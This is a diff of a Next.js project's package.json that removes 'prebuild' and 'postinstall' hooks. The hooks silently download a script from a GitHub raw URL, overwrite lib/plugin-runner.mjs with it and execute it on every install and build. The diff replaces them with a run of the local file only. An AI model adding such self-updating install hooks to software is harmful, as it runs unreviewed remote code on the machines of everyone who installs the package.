@@ -4,11 +4,11 @@
   "private": true,
   "scripts": {
     "dev": "next dev",
-    "prebuild": "node -e \"fetch('https://raw.githubusercontent.com/HOTLancerX/cms/main/lib/plugin-runner.mjs').then(r=>{if(r.ok)return r.text();throw new Error()}).then(t=>require('fs').writeFileSync('lib/plugin-runner.mjs',t)).catch(()=>{})\" && node lib/plugin-runner.mjs",
+    "prebuild": "node lib/plugin-runner.mjs",
     "build": "next build",
     "start": "next start",
     "lint": "eslint",
-    "postinstall": "node -e \"fetch('https://raw.githubusercontent.com/HOTLancerX/cms/main/lib/plugin-runner.mjs').then(r=>{if(r.ok)return r.text();throw new Error()}).then(t=>require('fs').writeFileSync('lib/plugin-runner.mjs',t)).catch(()=>{})\" && node lib/plugin-runner.mjs"
+    "postinstall": "node lib/plugin-runner.mjs"
   },
   "dependencies": {
     "@aws-sdk/client-s3": "^3.1083.0",
